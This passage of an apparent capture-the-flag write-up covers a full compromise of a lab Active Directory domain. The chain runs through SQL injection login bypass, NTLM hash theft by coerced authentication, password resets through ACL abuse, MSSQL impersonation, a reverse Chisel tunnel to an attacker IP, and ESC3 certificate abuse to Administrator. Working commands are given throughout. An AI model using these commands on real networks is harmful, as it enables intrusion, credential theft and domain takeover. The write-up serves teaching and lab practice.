 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET       29l       95w     1245c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET     1281l     2794w    45240c http://shadowgate.local/pentest-process.html
200      GET      417l     2084w    26230c http://shadowgate.local/customer-say.html
200      GET     1164l     3057w    45378c http://shadowgate.local/our-team.html
200      GET     1906l     4265w    63405c http://shadowgate.local/
301      GET        2l       10w      156c http://shadowgate.local/pictures => http://shadowgate.local/pictures/
301      GET        2l       10w      156c http://shadowgate.local/Pictures => http://shadowgate.local/Pictures/
404      GET       40l      156w     1888c http://shadowgate.local/con
404      GET       40l      156w     1897c http://shadowgate.local/pictures/con
404      GET       40l      156w     1897c http://shadowgate.local/Pictures/con
404      GET       40l      156w     1888c http://shadowgate.local/aux
404      GET       40l      156w     1897c http://shadowgate.local/pictures/aux
404      GET       40l      156w     1897c http://shadowgate.local/Pictures/aux
301      GET        2l       10w      156c http://shadowgate.local/PICTURES => http://shadowgate.local/PICTURES/
404      GET       40l      156w     1897c http://shadowgate.local/PICTURES/con
400      GET        6l       26w      324c http://shadowgate.local/error%1F_log
400      GET        6l       26w      324c http://shadowgate.local/pictures/error%1F_log
400      GET        6l       26w      324c http://shadowgate.local/Pictures/error%1F_log
404      GET       40l      156w     1888c http://shadowgate.local/prn
404      GET       40l      156w     1897c http://shadowgate.local/pictures/prn
404      GET       40l      156w     1897c http://shadowgate.local/PICTURES/aux
404      GET       40l      156w     1897c http://shadowgate.local/Pictures/prn
```

The team section lists a number of employees with their names and photos:

{% image5 %}

Collecting all the names into a `names.txt` list:

```c
Mitch Ressek
Bogdan Radzik
Milo Weis
Oscar Mazerath
Sam Hadges
Daniel Ramus
Ryan James
Sarah Chen
Marcus Rodriguez
Alexandra Petrov
```

Generating username permutations from those names with namemash ( [https://github.com/krlsio/python/blob/main/namemash.py](https://github.com/krlsio/python/blob/main/namemash.py) ):

{% image6 %}

Validating the generated usernames with `kerbrute` returns no valid accounts:

{% image7 %}

Switching tactics to hunt for virtual hosts, fuzzing the `Host` header with `ffuf`:

```c
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://shadowgate.local/ -H 'Host: FUZZ.shadowgate.local' --fs 63405
```

{% image8 %}

### WebServer Enumeration - dev.shadowgate.local

{% image9 %}

The `dev.shadowgate.local` virtual host exposes a File Upload Workflow with some revealing details:

```c
Developer Upload: Upload your files to the secure development portal
Automated Processing: Files are automatically transferred to the dev$ network share
Security Review: All uploaded files are reviewed and processed by mitch.r
Secure Storage: Files are stored in encrypted format with access logging
```

Uploaded files are automatically transferred to a `dev$` network share, confirming that share exists. More importantly, every file is reviewed by the user `mitch.r`, which opens an NTLMv2 theft path: a file that coerces authentication will make `mitch.r` authenticate back to an attacker-controlled host when reviewed.

{% image10 %}

An AS-REP Roasting attempt against `mitch.r` fails, since the account does not have the `UF_DONT_REQUIRE_PREAUTH` flag set:

{% image11 %}

Turning to the dev portal's login page, intercepting a request to prepare a brute-force:

{% image12 %}

Running the brute-force with `ffuf`:

```c
ffuf -request file.req -request-proto http -w /usr/share/wordlists/rockyou.txt -fr "Invalid credentials"
```

{% image13 %}

Logging in with one of the passwords that produced a 500 response returns a revealing error:

{% image14 %}

The password `asdfghjkl;'` produced `Unclosed quotation mark after the character string`. The trailing `'` broke out of a single-quoted SQL string literal, so the input lands directly inside the query. It is almost certainly built like this:

```sql
SELECT*FROM usersWHERE username='<txtUser>'AND password='<txtPass>'
```

No parameterization and no escaping, which is the entire vulnerability.

Authenticating with the payload `' OR 1=1 --` bypasses the check and lands inside the secure file upload:

{% image15 %}

`sqlmap` confirms and automates the same injection:

{% image16 %}

### NTLMv2 Stealing - LNK Files

Generating the coercion files with ntlm_theft ( [https://github.com/Greenwolf/ntlm_theft](https://github.com/Greenwolf/ntlm_theft) ), using the `tun0` address as the listener IP:

{% image17 %}

Uploading the generated files through the secure file upload:

{% image18 %}

When `mitch.r` reviews the upload, `responder` captures the account's NTLMv2 hash:

{% image19 %}

Saving the hash to `mitch.r.hash` and cracking it with John the Ripper:

{% image20 %}

A parallel `sqlmap` run was taking too long and was cancelled:

{% image21 %}

Validating the recovered credentials with an SMB query:

{% image22 %}

### Active Directory - Domain Reconnaissance

Gathering the domain data with `rusthound`:

```c
rusthound --domain shadowgate.local --ldapusername 'mitch.r' --ldappassword 'snitch1993' --ldapfqdn SG-DC01.shadowgate.local --ldapip 10.1.106.153 --name-server 10.1.106.153 --collectionmethod All --zip
```

{% image23 %}

The BloodHound data shows `mitch.r` holds `ForceChangePassword` over the `MILO.W` and `RYAN.J` users:

{% image24 %}

`MILO.W` in turn holds `WriteOwner` over the `SVC_MSSQL` account:

{% image25 %}

Controlling `SVC_MSSQL` should grant access to the MSSQL instance running on the DC. The chain starts by resetting the password of `MILO.W` with bloodyAD.

### ForceChangePassword - MILO.W

This command sets the password to `Password123!`:

```c
bloodyAD -d shadowgate.local -u 'mitch.r' -p 'snitch1993' -i 10.1.106.153 set password 'MILO.W' 'Password123!'
[+] Password changed successfully!
```

{% image26 %}

### WriteOwner - SVC_MSSQL

Abusing `WriteOwner` takes three steps: claim ownership of the account, grant `MILO.W` full control over it, then reset its password. Starting with the ownership change:

```c
impacket-owneredit -action write -new-owner 'MILO.W' -target 'SVC_MSSQL' 'shadowgate.local'/'MILO.W':'Password123!'
```

{% image27 %}

Granting `MILO.W` full control (GenericAll) over `SVC_MSSQL`:

```c
impacket-dacledit -action 'write' -rights 'FullControl' -principal 'MILO.W' -target 'SVC_MSSQL' 'shadowgate.local'/'MILO.W':'Password123!'
```

{% image28 %}

With full control in place, resetting the `SVC_MSSQL` password using `bloodyAD`:

```c
bloodyAD -d shadowgate.local -u 'milo.w' -p 'Password123!' -i 10.1.106.153 set password 'svc_mssql' 'Password123!'
```

{% image29 %}

### MSSQL - Access & Enumeration

`netexec` confirms the new credentials work against the MSSQL service:

{% image30 %}

Connecting with `impacket-mssqlclient` to explore what the account can do:

```c
impacket-mssqlclient shadowgate.local/svc_mssql:'Password123!'@SG-DC01.shadowgate.local -windows-auth
```

{% image31 %}

### MSSQL - User Impersonation

The `enum_impersonate` command shows the login can impersonate the user `bogdan.r`:

{% image32 %}

Impersonating that user with `exec_as_login SHADOWGATE\bogdan.r`:

{% image33 %}

### MSSQL - NTLMv2 Stealing

Coercing that user's authentication to capture its hash with `xp_dirtree`, pointing it at a Responder listener:

{% image34 %}

Cracking the captured hash succeeds:

{% image35 %}

The recovered password is `bogdan0126`. Validating it with `netexec`:

{% image36 %}

Back in the BloodHound data, `bogdan.r` belongs to the Remote Management Users group.

{% image37 %}

That membership grants WinRM access, so connecting with `evil-winrm`:

{% image38 %}

The Outbound Object Control section shows `bogdan.r` holds `GenericAll` over the `OSCAR.M` and `DANIEL.R` users:

{% image39 %}

### GenericAll - OSCAR and DANIEL

Resetting both users' passwords with `bloodyAD` as before:

```c
bloodyAD -d shadowgate.local -u 'bogdan.r' -p 'bogdan0126' -i 10.1.106.153 set password 'OSCAR.M' 'Password123!'

bloodyAD -d shadowgate.local -u 'bogdan.r' -p 'bogdan0126' -i 10.1.106.153 set password 'DANIEL.R' 'Password123!'
```

{% image40 %}

An SMB check works for `DANIEL.R`, but `OSCAR.M` returns `STATUS_INVALID_LOGON_HOURS`, meaning that account is restricted to specific logon hours:

{% image41 %}

The `GenericAll` right over the account, confirmed in both BloodHound and bloodyAD, is the way around that restriction:

{% image42 %}

The `logonHours` attribute can be overwritten. Reading the current value first:

{% image43 %}

Setting `logonHours` to allow every hour so the account can log on at any time:

```c
bloodyAD -d shadowgate.local -u 'bogdan.r' -p 'bogdan0126' -i 10.1.106.153 set object oscar.m logonHours -v '////////////////////////////' --b64
```

{% image44 %}

The account now authenticates, validated again with netexec over SMB:

{% image45 %}

The BloodHound data also places `OSCAR.M` in the Remote Management Users group, so it too can connect over `evil-winrm`:

{% image46 %}

### OSCAR.M - Internal Reconnaissance

The account's home folder contains a `Mails` folder with the following message:

{% image47 %}

The email reads:

```c
From: mitch.r
To: oscar.m
Subject: Update Regarding Sam H.’s Departure

Hi Oscar,

I wanted to inform you that Sam H. has officially resigned from his position. His user account is no longer needed and should be removed from the system.

Additionally, since Sam was responsible for certificate issuance management (Manage-CA), please identify a suitable replacement to ensure that our certificate services continue operating without interruption.

During a recent internal review, we also identified a potential ESC-related misconfiguration within our Active Directory Certificate Services environment. While no abuse has been confirmed, the configuration could allow unintended certificate enrollment or privilege escalation if left unmanaged. This finding further emphasizes the need for proper ownership and oversight of the CA role.

As a temporary security measure, the LDAP/RPC enrollment ports on the CA server have been blocked at the firewall, since there is currently no designated staff member to oversee certificate operations.

Please note:
If no suitable successor for Sam’s role is appointed in a timely manner, we may be required to shut down the certificate service entirely. Without proper oversight, there is a heightened risk that someone could attempt to bypass or tunnel around the firewall restrictions, especially in light of the identified ESC weakness, leading to potential misuse of our enrollment endpoints. This measure would be taken to ensure the security and integrity of our environment.

Once a new responsible person is appointed, the blocked ports can be re-enabled to restore full certificate enrollment capabilities.

Let me know once the account has been removed and when you have identified a candidate for the role.

Regards,
Mitch R.
```

### Active Directory Certificate Services - ADCS Enumeration

The email hints at an AD CS misconfiguration with the enrollment ports firewalled off, so reaching the CA requires tunnelling. Setting up a Chisel SOCKS proxy to run `certipy-ad` through the compromised host:

1. On our machine: `./chisel_linux server -p 1337 --reverse`
2. On the attacked machine: `.\chisel.exe client 10.200.72.27:1337 R:socks`

With the tunnel up, the requests run through `proxychains`:

```c
sudo proxychains4 -f /etc/proxychains4.conf -q certipy-ad find -u oscar.m@shadowgate.local -p 'Password123!' -dc-ip 10.1.106.153 -ns 10.1.106.153  -vulnerable -stdout
```

{% image48 %}

The output references an unresolved SID, `S-1-5-21-2396436576-3267128377-3646372360-1114`, worth resolving with `impacket-lookupsid` and cross-checking in BloodHound:

{% image49 %}

The `impacket-lookupsid` command: `impacket-lookupsid shadowgate.local/oscar.m:'Password123!'@10.1.106.153`

{% image50 %}

### Active Directory - Deleted Objects

The SID does not resolve to any live object, which suggests the referenced principal (the user Sam and a related group) has been deleted. Checking whether the AD Recycle Bin feature is enabled:

```c
bloodyAD --host SG-DC01.shadowgate.local -d shadowgate.local  -u 'OSCAR.M' -p 'Password123!' get search --base "CN=Partitions,CN=Configuration,DC=shadowgate,DC=local" --filter "(objectClass=*)" --attr msDS-EnabledFeature
```

{% image51 %}

It is enabled. Listing the deleted objects:

```c
bloodyAD --host SG-DC01.shadowgate.local -d shadowgate.local  -u 'OSCAR.M' -p 'Password123!' get search --base "DC=shadowgate,DC=local" --filter "(isDeleted=TRUE)" --attr dn,lastKnownParent,msDS-LastKnownRDN,whenChanged -c 1.2.840.113556.1.4.2064 -c 1.2.840.113556.1.4.2065
```

{% image52 %}

The deleted objects include `Shadowgate-BackupOperators` and the user `sam.h`. Reanimating a tombstoned object requires the `Reanimate-Tombstones` extended right, so the next step is finding who holds it, using PowerView:

```c
Get-DomainObjectAcl -Identity "DC=shadowgate,DC=local" -ResolveGUIDs |
  Where-Object { $_.ObjectAceType -match 'Reanimate' } |
  ForEach-Object { ConvertFrom-SID $_.SecurityIdentifier }
```

{% image53 %}

The `oscar.m` account holds that right. Restoring the objects starts with obtaining a TGT for `oscar.m`:

{% image54 %}

→ restore_samh.ldif:

```c
dn: CN=sam.h\0ADEL:c9316c03-4a09-4d46-9db0-f45925e154f1,CN=Deleted Objects,DC=shadowgate,DC=local
changetype: modify
delete: isDeleted
-
replace: distinguishedName
distinguishedName: CN=sam.h,CN=Users,DC=shadowgate,DC=local
```

→ restore_backupops.ldif:

```c
dn: CN=Shadowgate-BackupOperators\0ADEL:4245395a-165f-4591-9735-34bfc091da2e,CN=Deleted Objects,DC=shadowgate,DC=local
changetype: modify
delete: isDeleted
-
replace: distinguishedName
distinguishedName: CN=Shadowgate-BackupOperators,CN=Users,DC=shadowgate,DC=local
```

Restoring them with `ldapmodify` over GSSAPI:

```c
sudo faketime '2026-07-16 19:58:05' ldapmodify -H ldap://SG-DC01.shadowgate.local \
  -Y GSSAPI \
  -e '!1.2.840.113556.1.4.2064' \
  -e '!1.2.840.113556.1.4.2065' \
  -f restore_samh.ldif
```

{% image55 %}

Restoring `sam.h` succeeds, but restoring the backup operators group fails:

{% image56 %}

**Error 53 / `00002077` / problem 5003 on a tombstone reanimation means the object is in the *recycled* state, not the *deleted* state.** When the AD Recycle Bin feature is enabled, a deleted object goes through two phases. First it is `isDeleted=TRUE` but still recoverable (the deleted-object / recycle-bin window, default 180 days). After the deleted-object lifetime it becomes `isRecycled=TRUE`, with its attributes stripped, and it can no longer be reanimated by clearing `isDeleted`. The `2077` status is what the DC throws when you try to un-delete something that has already crossed into the recycled state, or when the Recycle Bin is enabled and the legacy single-step reanimation is used on an object that requires the recycle-bin restore semantics.

Re-running `rusthound` (or checking with `bloodyAD`) now shows WRITE permission over the restored `sam.h` user:

{% image57 %}

Confirmed in BloodHound as well:

{% image58 %}

### GenericAll - SAM.H

Resetting the password of `SAM.H` with `bloodyAD`:

```c
bloodyAD -d shadowgate.local -u 'OSCAR.M' -p 'Password123!' -i 10.1.106.153 set password 'SAM.H' 'Password123!'
```

{% image59 %}

Now enumerating the certificate templates as `sam.h` through the proxy with `certipy-ad`:

```c
sudo proxychains4 -f /etc/proxychains4.conf -q certipy-ad find -u sam.h@shadowgate.local -p 'Password123!' -dc-ip 10.1.106.153 -ns 10.1.106.153  -vulnerable -stdout
```

It finds a vulnerable template:

{% image60 %}

→ The output:

```c
Certificate Templates
  0
    Template Name                       : Shadowgate-EnrollmentAgent
    Display Name                        : Shadowgate-EnrollmentAgent
    Certificate Authorities             : Shadowgate-CA
    Enabled                             : True
    Client Authentication               : False
    Enrollment Agent                    : True
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireUpn
                                          SubjectRequireDirectoryPath
    Enrollment Flag                     : AutoEnrollment
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Certificate Request Agent
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 2 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2025-12-07T17:51:15+00:00
    Template Last Modified              : 2025-12-07T17:51:19+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : SHADOWGATE.LOCAL\sam.h
                                          SHADOWGATE.LOCAL\Domain Admins
                                          SHADOWGATE.LOCAL\Enterprise Admins
      Object Control Permissions
        Owner                           : SHADOWGATE.LOCAL\Administrator
        Full Control Principals         : SHADOWGATE.LOCAL\Domain Admins
                                          SHADOWGATE.LOCAL\Enterprise Admins
        Write Owner Principals          : SHADOWGATE.LOCAL\Domain Admins
                                          SHADOWGATE.LOCAL\Enterprise Admins
        Write Dacl Principals           : SHADOWGATE.LOCAL\Domain Admins
                                          SHADOWGATE.LOCAL\Enterprise Admins
        Write Property Enroll           : SHADOWGATE.LOCAL\Domain Admins
                                          SHADOWGATE.LOCAL\Enterprise Admins
    [+] User Enrollable Principals      : SHADOWGATE.LOCAL\sam.h
    [!] Vulnerabilities
      ESC3                              : Template has Certificate Request Agent EKU set.
```

### AD CS - ESC3 Exploitation

ESC3 abuses a template that carries the Certificate Request Agent EKU. The process has three steps: enroll for an Enrollment Agent certificate, use it to request a certificate on behalf of a privileged user, then authenticate with that certificate.

First, obtain an Enrollment Agent certificate:

```c
sudo proxychains4 -f /etc/proxychains4.conf -q certipy-ad req -u sam.h@shadowgate.local -p 'Password123!' -dc-ip 10.1.106.153 -ns 10.1.106.153 -target 'SG-DC01.shadowgate.local' -ca 'Shadowgate-CA' -template 'Shadowgate-EnrollmentAgent'
```

{% image61 %}

Then use that Enrollment Agent certificate to request a certificate on behalf of the target user:

```c
sudo proxychains4 -f /etc/proxychains4.conf -q certipy-ad req -u sam.h@shadowgate.local -p 'Password123!' -dc-ip 10.1.106.153 -target 'SG-DC01.shadowgate.local' -ca 'Shadowgate-CA' -template 'User' -pfx sam.h.pfx -on-behalf-of 'SHADOWGATE\Administrator'
```

{% image62 %}

Finally, authenticate using the on-behalf-of certificate to recover the Administrator hash:

```c
sudo proxychains4 -f /etc/proxychains4.conf -q certipy-ad auth -pfx administrator.pfx -dc-ip 10.1.106.153
```

{% image63 %}

With the Administrator NT hash, connecting over `evil-winrm` to grab the final flag:

{% image64 %}